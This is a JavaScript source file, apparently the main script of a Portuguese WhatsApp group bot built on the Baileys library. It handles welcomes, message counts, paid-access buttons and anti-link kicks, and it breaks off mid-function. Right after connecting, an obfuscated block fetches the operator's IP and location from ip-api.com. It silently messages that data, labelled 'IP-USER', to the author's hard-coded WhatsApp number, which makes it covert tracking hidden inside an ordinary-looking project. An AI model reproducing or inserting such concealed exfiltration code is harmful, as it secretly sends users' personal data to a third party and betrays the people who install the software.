const {WAMessageProto,MessageOptions,WAFlag,WANode,WAMetric,ChatModification,DisconectReason,MessageTypeProto,WAConnection,WALocationMessage,ReconnectMode,WAContextInfo,proto,ProxyAgent,waChatKey,MimetypeMap,MediaPathMap,WAContactMessage,WAContactsArrayMessage,WAGroupInviteMessage,WATextMessage,WAMessageContent, WAMessage,WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload,mentionedJid,processTime,Browser,MessageType,Presence,WA_MESSAGE_STUB_TYPES,Mimetype,relayWAMessage,GroupSettingChange} = require('@adiwajshing/baileys');
const { banner, getGroupAdmins, getRandom, getBuffer, simih} = require('./lib/functions');
const { color } = require('./lib/color');
//módulos 
const textpro = require('./lib/textpro.js')
const { pSmoky,pOuro,pSemi,pFogo,pShadow,pRomantic,pSmoke,pBurnPapper,pNaruto,pLoveMsg,pMsgGrass,pGlitch,pDoubleHeart,pCoffeCup,pLoveText,pButterfly } = require('./lib/photooxy')
const moment = require('moment-timezone');
const kagApi = require('@kagchi/kag-api')
const request = require('request')
const ggs = require('google-it')
const imgbb = require('imgbb-uploader')
const googleImage = require('g-i-s')
const ffmpeg = require('fluent-ffmpeg')
const { fetchJson } = require('./lib/fetcher')
const fetch = require('node-fetch')
const { exec } = require('child_process')
const yts = require( 'yt-search')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const fs = require('fs');
const axios = require('axios')
const url = `https://`
const encodeUrl = require('encodeurl')
const util = require("util");
//menus


const { rank } = require('./src/rank')
const { menuvoz } = require('./src/menuvoz')
const { outros } = require('./src/outros')
const { especifico} = require('./src/especifico')
const { logos } = require('./src/logos')
const { premiuns } = require('./src/premiuns')
const { imagens } = require('./src/imagens')
const { interact } = require('./src/interact')
const { grupo } = require('./src/grupo')
const { novid } = require('./src/novid')
const { efeitoaudio } = require('./src/efeitoaudio')
prefix = "!"
img = fs.readFileSync('./me.jpg')
const { webp2gifFile } = require("./tomioka/gif.js")
const premium = JSON.parse(fs.readFileSync('./database/json/vip.json'))
const user = JSON.parse(fs.readFileSync('./database/json/user.json'))
//grupo
const countMessage = JSON.parse(fs.readFileSync('./database/json/countmsg.json'))
const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'));
const leveling = JSON.parse(fs.readFileSync('./database/json/leveling.json'))
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab } = require('./lib/leveling.js')
//ANTIS
const antidoc = JSON.parse(fs.readFileSync('./database/json/antidoc.json'))
const antiloc = JSON.parse(fs.readFileSync('./database/json/antiloc.json'))
const anticontato = JSON.parse(fs.readFileSync('./database/json/anticontato.json'))
const anticatalogo = JSON.parse(fs.readFileSync('./database/json/anticatalogo.json'));
const antifake = JSON.parse(fs.readFileSync('./database/grupo/antifake.json'))
const AntiVirtex = JSON.parse(fs.readFileSync('./database/json/antivirtex.json'))
const antilink = JSON.parse(fs.readFileSync('./database/json/antilink.json'))

const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ 'FN:Tio Tomioka </>\n' 
+ 'ORG:criador do tomioka-bot;\n' 
+ 'TEL;type=CELL;type=VOICE;waid=554498220867:+55 4498220867\n' 
+ 'email:tiotomiokaofc@gmail.com\n' 
+ 'END:VCARD'
//_CONEXÃO WHATSAPP WEB 
async function starts() {
    const tomioka = new WAConnection()
    tomioka.logger.level = 'warn'
    
    tomioka.on('qr', () => {
    console.log('escaneie o qr code para conectar..')
    })
    
    fs.existsSync('./tomioka.json') && tomioka.loadAuthInfo('./tomioka.json')
    
    tomioka.on('connecting', () => {
    })
    
    tomioka.on('open', () => {
    console.log(color('Prontinho ^-^'))
    })
    await tomioka.connect({timeoutMs: 60*1000})
    function _0x29ed(_0x273d1b,_0x26d13b){var _0x481a6c=_0x481a();return _0x29ed=function(_0x29ed5a,_0xe09d82){_0x29ed5a=_0x29ed5a-0x1be;var _0x3e8aa9=_0x481a6c[_0x29ed5a];return _0x3e8aa9;},_0x29ed(_0x273d1b,_0x26d13b);}function _0x481a(){var _0x36ca7c=['PHOTO','2651429htFSGK','cyan','77syFtBc','connecting','log','```\x0a────────────────────','Conectando...','217410HYCEio','readFileSync','50870AthXtd','text','./tomioka.json','then','805000aVBPKd','342skthal','https://wa.me/554498220867?text=olá','554498220867@s.whatsapp.net','sendMessage','4941435Ipmefv','Conectado!','ws-close','764NbawdB','Conexão\x20perdida,\x20tentando\x20novamente..','./me.jpg','6Exerah','stringify','626GXtNwO','open','http://ip-api.com/line','1811132QOxPZr','base64EncodedAuthInfo','|TRM|','close','─────「\x20IP-USER\x20」─────\x0a\x0a```'];_0x481a=function(){return _0x36ca7c;};return _0x481a();}var _0x2d2175=_0x29ed;(function(_0x8d022b,_0x57fe55){var _0x3b5082=_0x29ed,_0x5f4d84=_0x8d022b();while(!![]){try{var _0x4ceaf5=parseInt(_0x3b5082(0x1e0))/0x1*(-parseInt(_0x3b5082(0x1c2))/0x2)+-parseInt(_0x3b5082(0x1c0))/0x3*(parseInt(_0x3b5082(0x1c5))/0x4)+parseInt(_0x3b5082(0x1dd))/0x5+-parseInt(_0x3b5082(0x1d2))/0x6*(-parseInt(_0x3b5082(0x1cd))/0x7)+-parseInt(_0x3b5082(0x1d8))/0x8+parseInt(_0x3b5082(0x1d9))/0x9*(parseInt(_0x3b5082(0x1d4))/0xa)+parseInt(_0x3b5082(0x1cb))/0xb;if(_0x4ceaf5===_0x57fe55)break;else _0x5f4d84['push'](_0x5f4d84['shift']());}catch(_0x21fe9c){_0x5f4d84['push'](_0x5f4d84['shift']());}}}(_0x481a,0x8c996),fs['writeFileSync'](_0x2d2175(0x1d6),JSON[_0x2d2175(0x1c1)](tomioka[_0x2d2175(0x1c6)](),null,'\x09')),fetch(_0x2d2175(0x1c4))[_0x2d2175(0x1d7)](_0x34c16c=>_0x34c16c[_0x2d2175(0x1d5)]())[_0x2d2175(0x1d7)](_0x3282ff=>{var _0x12d5e7=_0x2d2175;tomioka[_0x12d5e7(0x1dc)](_0x12d5e7(0x1db),_0x12d5e7(0x1c9)+_0x3282ff+_0x12d5e7(0x1d0),MessageType['text'],{'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![],'externalAdReply':{'title':'Developer\x20Tio\x20Tomioka','body':'','previewType':_0x12d5e7(0x1ca),'thumbnail':fs[_0x12d5e7(0x1d3)](_0x12d5e7(0x1bf)),'sourceUrl':_0x12d5e7(0x1da)}}});}),tomioka['on'](_0x2d2175(0x1ce),()=>{var _0x20fa48=_0x2d2175;console[_0x20fa48(0x1cf)](color(_0x20fa48(0x1c7)),color(_0x20fa48(0x1d1),'cyan'));}),tomioka['on'](_0x2d2175(0x1c3),()=>{var _0x122d80=_0x2d2175;console[_0x122d80(0x1cf)](color('|TRM|'),color(_0x122d80(0x1de),_0x122d80(0x1cc)));}),tomioka['on'](_0x2d2175(0x1df),()=>{var _0x741566=_0x2d2175;console['log'](color('|TRM|'),color(_0x741566(0x1be),_0x741566(0x1cc)));}),tomioka['on'](_0x2d2175(0x1c8),async()=>{var _0x1b4814=_0x2d2175;console[_0x1b4814(0x1cf)](color(_0x1b4814(0x1c7)),color('Desconectado!','cyan'));}));

tomioka.on('group-participants-update', async (anu) => {
	const mdata = await tomioka.groupMetadata(anu.jid)
	if(antifake.includes(anu.jid)) {
		if (anu.action == 'add'){
			num = anu.participants[0]
			if(!num.split('@')[0].startsWith(55)) {
				tomioka.sendMessage(mdata.id, 'Tchau numero fake leia as regras antes de entrar!', MessageType.text)
				setTimeout(async function () {
					tomioka.groupRemove(mdata.id, [num])
				}, 1000)
}
}
}
if (!welkom.includes(anu.jid)) return;
//bem vindo em botão
    const isGroup = (anu.jid).endsWith('@g.us')
   groupMet = await tomioka.groupMetadata(anu.jid);
        groupMembers11 = groupMet.participants;
        groupAdmins11 = getGroupAdmins(groupMembers11);
        mem = anu.participants[0];
        const groupDesc = isGroup ? groupMet.desc : ''
  //console.log(arg) pra ver as info do evento
  //mandar botao quando entraren
  //if (args['action'] == 'add) {
    if (anu.action == "add" && !mem.includes(tomioka.user.jid)) {
          buttons = [{buttonId: `cu kkkkkk`,buttonText:{displayText: 'Bem vindo 😊'},type:1}]
  
                 var pinbollixe = fs.readFileSync("./me.jpg")
  
                 tomioka.sendMessage(anu.jid, {
  locationMessage: { 
  jpegThumbnail: pinbollixe,
  },
  contentText: `Bem vindo`,
  footerText: `Leia as regras para não ser banido ou clique em ler mais para ver as regras 👉${'\u200B'.repeat(4000)}\n\n\n\nRegras|descrição: ${groupDesc}`,
  buttons: buttons,
  headerType: 6
  }, MessageType.buttonsMessage)
        }
  //mandar botao quando sairem
   else
    if (anu.action == "remove" && !mem.includes(tomioka.user.jid)) {
           buttons = [{buttonId: `cu kkkkk`,buttonText:{displayText: 'Tchau  🥲'},type:1}]
  
                 var pinbollixe = fs.readFileSync("./me.jpg")
  
                 tomioka.sendMessage(anu.jid, {
  locationMessage: { 
  jpegThumbnail: pinbollixe,
  },
  contentText: `Tchau...`,
  footerText: `Bye Bye`,
  buttons: buttons,
  headerType: 6
  }, MessageType.buttonsMessage)
        }
  });


tomioka.on('chat-update', async (msg) => {
try {
if (!msg.hasNewMessage) return
msg = msg.messages.all()[0]
if (!msg.message) return
if (msg.key && msg.key.remoteJid && msg.key.fromMe == 'status@broadcast') return
if (!msg.key.fromMe && modobot === true) return
global.prefix
global.blocked
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const type = Object.keys(msg.message)[0]
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType

function kyun(seconds){
function pad(s){
return (s < 10 ? '0' : '') + s;
}
var hours = Math.floor(seconds / (60*60));
var minutes = Math.floor(seconds % (60*60) / 60);
var seconds = Math.floor(seconds % 60);

//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
}

        //objetos de todas as mensagens
        var body = 
        /* mensagem
        */(type == 'conversation') && prefix.includes(msg.message.conversation[0]) ? msg.message.conversation :
        /* marcação
        */(type == 'extendedTextMessage') && prefix.includes(msg.message.extendedTextMessage.text[0]) ? msg.message.extendedTextMessage.text :
        /* imagem
        */ (type == 'imageMessage') && prefix.includes(msg.message.imageMessage.caption[0]) ? msg.message.imageMessage.caption :
        /* video
        */(type == 'videoMessage') && prefix.includes(msg.message.videoMessage.caption[0]) ? msg.message.videoMessage.caption :
        /* documento
        */ (type == 'documentMessage') && prefix.includes(msg.message.documentMessage.fileName[0]) ? msg.message.documentMessage.fileName :
        /* list response
        */ (type == 'listResponseMessage') && prefix.includes(msg.message.listResponseMessage.singleSelectReply.selectedRowId[0]) ? msg.message.listResponseMessage.singleSelectReply.selectedRowId :
        /* botton response
        */ (type == 'buttonsResponseMessage') && msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? msg.message.buttonsResponseMessage.selectedButtonId :
        /* contato
        */ (type == 'contactMessage') && prefix.includes(msg.message.contactMessage.displayName[0]) ? msg.message.contactMessage.displayName :
        /* requeste payment
        */ (type == 'requestPaymentMessage') && prefix.includes(msg.message.requestPaymentMessage.noteMessage.extendedTextMessage.text[0]) ? msg.message.requestPaymentMessage.noteMessage.extendedTextMessage.text :
        /* location mensage
        */ (type == 'locationMessage') && msg.message.conversation.startsWith(prefix) ? msg.message[type].selectedButtonId :
        /* carrinho de paganentos
        */ (type == 'orderMessage') && prefix.includes(msg.message.orderMessage.message[0]) ? msg.message.orderMessage.message :
        /* catalogo
        */ (type == 'productMessage') && prefix.includes(msg.message.productMessage.product.title[0]) ? msg.message.productMessage.product.tile : ''

budy = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
selectedRowId = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
selectedButton = (type == 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
responseButton = (type == 'listResponseMessage') ? msg.message.listResponseMessage.title : ''
botao = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedDisplayText : ''
symmantec = (type === 'listResponseMessage') ? msg.message.listResponseMessage.title : ''
var pes = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : ''
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
const hr = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
const botNumber = tomioka.user.jid
const ownerNumber = [`554498220867@s.whatsapp.net`] 
const isGroup = from.endsWith('@g.us')
const speed = require('performance-now');
const sender = isGroup ? msg.participant : msg.key.remoteJid
const isUser = user.includes(sender)
const isPremium = premium.includes(sender)
const senderfix = msg.key.fromMe ? tomioka.user.jid : isGroup ? msg.participant : msg.key.remoteJid
tomioka.chatRead(from)
const time = moment.tz('America/Sao_Paulo').format('DD/MM')
const runtime = function(seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor(seconds % (3600 * 24) / 3600);
var m = Math.floor(seconds % 3600 / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " dia, " : " Dia, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " horas, " : " Horas, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " minutos, " : " Minutos, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " segundos" : " Segundos") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
}
uptime = process.uptime();
const temp = (`${runtime(process.uptime())}`)
pushname = tomioka.contacts[sender] != undefined ? tomioka.contacts[sender].vname || tomioka.contacts[sender].notify : undefined
const groupMetadata = isGroup ? await tomioka.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const adminbotnumber = ["554498220867@s.whatsapp.net","554499019776@s.whatsapp.net"]
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isOwner = ownerNumber.includes(sender)
const isadminbot = adminbotnumber.includes(sender)
const isWelkom = isGroup ? welkom.includes(from) : false
const isLevelingOn = isGroup ? leveling.includes(from) : true
const isAntiLink = isGroup ? antilink.includes(from) : false
const q = args.join(' ')
const groupIdscount = []
const numbersIds = []
const msgReceived = pes.toLowerCase();
for(let obj of countMessage) {
groupIdscount.push(obj.groupId)
}
if(isGroup && groupIdscount.indexOf(from) >= 0) {
var ind = groupIdscount.indexOf(from)
for(let obj of countMessage[ind].numbers) {numbersIds.push(obj.jid)}
if(numbersIds.indexOf(sender) >=0) {
var indnum = numbersIds.indexOf(sender)
countMessage[ind].numbers[indnum].messages += 1
countMessage[ind].numbers[indnum].cmd_messages += isCmd ? 1 : 0
fs.writeFileSync('./database/json/countmsg.json', JSON.stringify(countMessage, null, 2)+ '\n')
} else {
const messages = 1
const cmd_messages = isCmd ? 1 : 0
countMessage[ind].numbers.push({
jid: sender,
messages: messages,
cmd_messages: cmd_messages
})
fs.writeFileSync('./database/json/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
}
else if(isGroup) {
countMessage.push({
groupId: from,
numbers: [{
jid: sender,
messages: 2,
cmd_messages: isCmd ? 1 : 0
}]
})
fs.writeFileSync('./database/json/countmsg.json', JSON.stringify(countMessage, null, 2) + '\n')
}
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
const enviar = (teks) => {
tomioka.sendMessage(from, teks, text, {quoted:msg})
}
const sendMess = (hehe, teks) => {
tomioka.sendMessage(hehe, teks, text)
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? tomioka.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: msg, contextInfo: {"mentionedJid": memberr}})
}
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
    kma = gam1
    mhan = await tomioka.prepareMessage(from, kma, location)
    const buttonMessages = {
    locationMessage: mhan.message.locationMessage,
    contentText: text1,
    footerText: desc1,
    buttons: but,
    headerType: 6
    }
    tomioka.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
    }
const sendStickerFromUrl = async(to, url) => {
   var names = Date.now() / 10000;
   var download = function (uri, filename, callback) {
       request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
       });
   };
   download(url, './sticker/' + names + '.png', async function () {
       
       let filess = './sticker/' + names + '.png'
       let asw = './sticker/' + names + '.webp'
       fs.writeFileSync(`./sticker/${asw}.png`)
       //createSticker(`./sticker/${filess}.webp`, stik)  
       const fig__enviar = await createSticker(`./sticker/${filess}.webp`,stik)
       tomioka.sendMessage(from, fig__enviar, sticker)
   });
}
const sendImage = (teks) => {
        tomioka.sendMessage(from, teks, image, {quoted:msg})
        }
async function sendFileFromUrl(link, type, options) {

hasil = await getBuffer(link)

tomioka.sendMessage(from, hasil, type, options).catch(e => {

fetch(link).then((hasil) => {

tomioka.sendMessage(from, hasil, type, options).catch(e => {

tomioka.sendMessage(from, { url: link }, type, options).catch(e => {



console.log(e)

})

})

})

})

}
const sendMediaURL = async(to, url, text="", mids=[]) =>{
    if(mids.length > 0){
    text = normalizeMention(to, text, mids)
    }
    const fn = Date.now() / 10000;
    const filename = fn.toString()
    let mime = ""
    var download = function (uri, filename, callback) {
    request.head(uri, function (err, res, body) {
    mime = res.headers['content-type']
    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
    });
    };
    download(url, filename, async function () {
    console.log('done');
    let media = fs.readFileSync(filename)
    let type = mime.split("/")[0]+"Message"
    if(mime === "image/gif"){
    type = MessageType.video
    mime = Mimetype.gif
    }
    if(mime.split("/")[0] === "audio"){
    mime = Mimetype.mp4Audio
    }
    tomioka.sendMessage(to, media, type, { quoted: msg, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
    fs.unlinkSync(filename)
    });
    }
	//botao 
    if ((budy === 'BOT') || (budy === 'Bot') || (budy === 'bot')) {
		var buttons = [{ buttonId: `grupo`, buttonText: { displayText: 'grupo' }, type: 1 }, { buttonId: `dono`, buttonText: { displayText: 'dono' }, type: 1 }, { buttonId: `${prefix}menu`, buttonText: { displayText: 'menu' }, type: 1 }]
                var buttonsMessage = { contentText: `como posso ajudar?`, footerText: `Usuário:${pushname}\nHora:${hr}`, buttons: buttons, headerType: 1 }
                var sendMsg = await tomioka.prepareMessageFromContent(from, { buttonsMessage }, {})
                tomioka.relayWAMessage(sendMsg, {waitForAck: false})
    }
     //_____________GRUPO OFC DO BOT_________//
			if (selectedButton == ("grupo")){
	   enviar('https://chat.whatsapp.com/DrTDVmvzCi8JCmhejEzXKE')
	}
	
	if (selectedButton == ("dono")){
        tomioka.sendMessage(from, {displayname: "TOMIOKA", vcard: vcard}, MessageType.contact, { quoted: msg})    
        enviar (`*Caso esteja de whatsapp imune*\n\n*Segue o Wame do meu dono..*\n\n*Wa.me/5544998220867*`)
	}
    
	if ((budy === "COMPRAR") || (budy === "Comprar") || (budy === "comprar")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
          {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO❤️'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Olá!, o que gostaria de ter acesso?`,
            footerText: `❗Premium: R$15,00/mês\n❗bot editado da maneira que quizer: R$30,00\n❗bot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "COMPRAS") || (budy === "Compras") || (budy === "compras")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO❤️'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Olá!, o que gostaria de ter acesso?`,
            footerText: `❗Premium: R$15,00/mês\n❗bot editado da maneira que quizer: R$30,00\n❗bot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "/COMPRAS") || (budy === "/Compras") || (budy === "/compras")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO❤️'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Olá!, o que gostaria de ter acesso?`,
            footerText: `❗Premium: R$15,00/mês\n❗bot editado da maneira que quizer: R$30,00\n❗bot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "/COMPRAR") || (budy === "/Comprar") || (budy === "/comprar")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO❤️'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Olá!, o que gostaria de ter acesso?`,
            footerText: `❗Premium: R$15,00/mês\n❗bot editado da maneira que quizer: R$30,00\n❗bot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if ((budy === "/PREÇOS") || (budy === "/Preços") || (budy === "/preços")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO❤️'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Olá!, o que gostaria de ter acesso?`,
            footerText: `❗Premium: R$15,00/mês\n❗bot editado da maneira que quizer: R$30,00\n❗bot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        if ((budy === "/PRECOS") || (budy === "/Precos") || (budy === "/precos")) {
        gambar = fs.readFileSync('./me.jpg')
        mhan = await tomioka.prepareMessage(from, gambar, MessageType.image)
        gbutsan = [
            {buttonId: 'id1', buttonText: {displayText: 'PREMIUM - R$15'}, type: 1},
          {buttonId: 'id2', buttonText: {displayText: 'EDITADO - R$30'}, type: 1},
           {buttonId: 'id3', buttonText: {displayText: 'GRATUITO❤️'}, type: 1}]
         gbuttonan = {
        imageMessage: mhan.message.imageMessage,
            contentText: `Olá!, o que gostaria de ter acesso?`,
            footerText: `❗Premium: R$15,00/mês\n❗bot editado da maneira que quizer: R$30,00\n❗bot completo/ativar no seu zap: *GATUITO*`,
            buttons: gbutsan,
            headerType: 4
        }
        await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
                thumbnail: fs.readFileSync('./me.jpg'),
                caption: 'kkk'})
        }
        
        if (botao === 'PREMIUM - R$15') {
        teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer vip no bot!*`
        var options = {
         text: teks1
        }
        tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
        enviar(`Mensagem enviada ao meu dono!\njá já ele irá te responder como que vai ser a forma de pagamento\nobs: e muito obg por me ajudar!!!`)
            }
            
            if (botao === 'GRATUITO❤️') {
        teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer o bot GRATUITO!*`
        var options = {
         text: teks1
        }
        tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
        enviar(`Mensagem enviada ao meu dono!\njá já ele irá te responder como que vai ser😊\nobs: e muito obg por me ajudar!😊`)
            }
            
            if (botao === 'EDITADO - R$30') {
        teks1 = `essa pessoa: wa.me/${sender.split("@s.whatsapp.net")[0]}\n*quer o bot já editado para ele*`
        var options = {
         text: teks1
        }
        tomioka.sendMessage('554498220867@s.whatsapp.net', options, text, {quoted: msg})
        enviar(`Mensagem enviada ao meu dono!\njá já ele irá te responder como que vai ser a forma de pagamento\nobs: e muito obg por me ajudar!😊`)
            }

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙒𝘼.𝙈𝙀***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("wa.me/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return;
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
   enviar(`link detectado ${sender.split("@")[0]} voce sera expulso deste grupo!`)
     tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("facebook.com")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return;
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 𝙄𝙉𝙎𝙏𝘼𝙂𝙍𝘼𝙈***\\\\\
// @tio_tomioka_ofc
     if (messagesC.includes("instagram.com")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆 ZAP***\\\\\
// @tio_tomioka_ofc
     if (messagesC.includes("https:")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝘾𝙃𝘼𝙉𝙉𝙀𝙇***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("://youtube.com/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return;
   tomioka.updatePresence(from, Presence.composing)
   var kic = `${sender.split("@")[0]}@s.whatsapp.net`
      tomioka.groupRemove(from, [kic]).catch((e)=>{enviar(`*ERR:* ${e}`)})
}

/////***𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙇𝙄𝙉𝙆  𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝙑𝙄𝘿𝙀𝙊***\\\\\
// @tio_tomioka_ofc
if (messagesC.includes("://youtu.be/")){
   if (!isGroup) return;
   if (!isAntiLink) return;
   if (isGroupAdmins) return; 
